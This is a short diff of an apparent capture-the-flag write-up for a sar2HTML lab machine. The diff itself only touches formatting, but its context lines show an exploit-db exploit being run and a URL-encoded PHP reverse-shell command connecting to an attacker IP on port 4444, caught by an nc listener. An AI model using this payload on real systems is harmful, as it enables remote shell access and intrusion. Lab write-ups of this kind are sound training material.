@@ -136,7 +136,7 @@ Shellcodes: No Results
 
 ![IMG](../FILES/sar/img-20220721114822.png)
 ![IMG](../FILES/sar/img-20220721114914.png)
->https://www.exploit-db.com/exploits/49344
+<br>https://www.exploit-db.com/exploits/49344
 ```
 └─$ python3 exploit.py                                                                                                                                     1 ⨯
 Enter The url => http://192.168.146.58/sar2HTML/
@@ -164,7 +164,7 @@ sarFILE
 Command => nc
 Command => php%20-r%20'%24sock%3Dfsockopen(%22192.168.146.63%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B'
 ```
-### 提权
+## 提权
 ```
 └─$ nc -nvlp 4444                                                                                                                                          1 ⨯
 listening on [any] 4444 ...
